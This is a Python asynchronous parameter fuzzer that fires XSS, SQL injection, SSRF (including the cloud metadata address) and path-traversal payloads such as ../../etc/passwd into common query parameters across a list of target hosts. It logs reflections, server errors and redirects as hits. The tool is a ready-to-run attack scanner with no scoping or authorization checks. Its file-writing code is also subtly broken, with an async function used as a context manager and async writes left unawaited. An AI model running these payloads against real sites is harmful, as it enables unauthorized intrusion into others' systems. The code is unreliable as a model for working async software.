#!/usr/bin/env python3
# async_param_fuzzer.py
# Usage:
# python3 async_param_fuzzer.py --input seed_urls.txt --outdir out/example.com --concurrency 30

import argparse, asyncio, aiohttp, os, urllib.parse, time
from aiohttp import ClientSession

# Minimal payload lists (replace/extend with your own)
XSS_PAYLOADS = ['"><script>alert(1)</script>', "'\"><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"]
SQLI_PAYLOADS = ["' OR '1'='1", "';--", "\" OR \"\"=\""]
SSRF_PAYLOADS = ["http://127.0.0.1:8000/", "http://169.254.169.254/", "http://localhost:8080/"]

COMMON_PARAMS = [
 "id","user_id","userid","uid","token","auth_token","session","session_id",
 "next","redirect","url","return_to","file","filename","path","email","username","callback","q"
]

HEADERS = {
 "User-Agent": "Mozilla/5.0 (compatible; param-fuzzer/1.0)",
 "Accept": "*/*"
}

async def try_param(session: ClientSession, base_url: str, param: str, payload: str, outfh):
    parsed = urllib.parse.urlparse(base_url)
    qs = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    qs[param] = payload
    new_qs = urllib.parse.urlencode(qs, doseq=True)
    new_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
    try:
        async with session.get(new_url, timeout=15, allow_redirects=False) as resp:
            text = await resp.text(errors='ignore')
            # quick heuristics: reflection or status change
            if payload in text or resp.status >= 500 or resp.status in (301,302):
                outfh.write(f"[HIT] {resp.status} {new_url}\n")
                outfh.flush()
    except Exception as e:
        outfh.write(f"[ERR] {new_url} -> {e}\n")
        outfh.flush()

async def fuzz_url(session: ClientSession, url: str, outdir: str, concurrency: int):
    outfile = os.path.join(outdir, "fuzzer_hits.txt")
    os.makedirs(outdir, exist_ok=True)
    sem = asyncio.Semaphore(concurrency)
    async with aiofiles_open(outfile, mode='a') as outfh:
        tasks = []
        for param in COMMON_PARAMS:
            # choose payload set by param type heuristics
            if param in ("id","user_id","userid","uid"): payloads = SQLI_PAYLOADS + SSRF_PAYLOADS
            elif param in ("next","redirect","url","return_to","callback"): payloads = SSRF_PAYLOADS + XSS_PAYLOADS
            elif param in ("token","auth_token","session","session_id"): payloads = ["../../etc/passwd","admin' --"]  # test token tamper
            elif param in ("file","filename","path"): payloads = ["../../../../etc/passwd","/etc/passwd","/var/www/html/shell.php"]
            else: payloads = XSS_PAYLOADS + SQLI_PAYLOADS
            for p in payloads:
                async def sem_task(p=p, param=param):
                    async with sem:
                        await try_param(session, url, param, p, outfh)
                tasks.append(asyncio.create_task(sem_task()))
        await asyncio.gather(*tasks)

# tiny helper to use aiofiles asynchronously for writing (fallback if missing)
try:
    import aiofiles
    async def aiofiles_open(fname, mode='a'):
        return await aiofiles.open(fname, mode=mode)
except Exception:
    # fallback synchronous writer inside coroutine
    import io
    class SyncWrapper:
        def __init__(self, fname, mode):
            self.f = open(fname, mode)
        async def write(self, s):
            self.f.write(s)
            self.f.flush()
        async def flush(self):
            self.f.flush()
        async def close(self):
            self.f.close()
        # context manager
        async def __aenter__(self): return self
        async def __aexit__(self, exc_type, exc, tb):
            self.f.close()
    async def aiofiles_open(fname, mode='a'):
        return SyncWrapper(fname, mode)

async def main(args):
    targets = []
    with open(args.input, 'r') as fh:
        for line in fh:
            line = line.strip()
            if not line: continue
            # prefer URLs; if just host, convert to https://host/
            if not line.startswith("http"):
                line = "https://" + line
            targets.append(line)
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        for url in targets:
            print("[*] fuzzing", url)
            await fuzz_url(session, url, args.outdir, args.concurrency)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", required=True, help="file with seed urls/hosts")
    parser.add_argument("--outdir", default="./out", help="output dir")
    parser.add_argument("--concurrency", type=int, default=20)
    args = parser.parse_args()
    asyncio.run(main(args))
